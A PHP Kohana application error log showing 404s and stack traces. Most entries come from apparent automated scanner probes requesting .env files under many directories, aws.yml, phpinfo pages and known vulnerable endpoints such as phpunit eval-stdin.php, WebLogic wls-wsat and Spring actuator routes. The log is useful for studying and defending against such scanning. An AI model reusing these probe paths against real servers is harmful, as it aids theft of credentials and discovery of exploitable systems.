2025-10-29 07:26:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 09:22:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 09:22:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 09:37:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: druid/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 09:37:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: druid/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 09:38:31 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 09:38:31 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 09:48:48 --- ERROR: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
2025-10-29 09:48:48 --- STRACE: ErrorException [ 8 ]: Undefined offset: 1 ~ APPPATH/bootstrap.php [ 467 ]
--
#0 /var/www/html/application/bootstrap.php(467): Kohana_Core::error_handler(8, 'Undefined offse...', '/var/www/html/a...', 467, Array)
#1 /var/www/html/index.php(107): require('/var/www/html/a...')
#2 {main}
2025-10-29 09:49:17 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/gateway/routes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 09:49:17 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/gateway/routes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 10:15:11 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-29 10:15:11 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-29 10:37:10 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-29 10:37:10 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-29 10:40:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 10:40:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backend/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backend/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app_dev.php/_profiler/phpinfo ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app_dev.php/_profiler/phpinfo ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:08 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 11:12:08 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 11:12:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: images/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: images/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: library/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: library/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: API/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: API/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: client/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: client/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: blogs/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: blogs/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:16 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: settings/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:16 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: settings/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: html/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: html/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: aws.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: aws.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:20 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apis/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:20 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apis/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: stage/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: stage/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: auth/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: auth/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: platform/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: platform/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: data/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: data/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: developer/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: developer/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: home/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: home/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 11:12:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: media/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 11:12:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: media/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:02:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: owa/auth/logon.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:02:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: owa/auth/logon.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:08:00 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:00 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:00 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:00 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:00 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:00 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:01 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:01 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:01 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:01 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:01 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:01 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dns-query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:02 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:02 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:02 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:02 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:02 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:02 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:02 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:02 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:02 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:02 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:03 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:03 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:03 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:03 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:04 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:04 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:04 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:04 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:04 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:04 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:04 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:04 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:08:05 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:08:05 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL resolve was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL goform/webRead/open was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL goform/webRead/open was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL wls-wsat/CoordinatorPortType was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL wls-wsat/CoordinatorPortType was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/login.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/login.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 12:26:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply_sec.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 12:26:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apply_sec.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
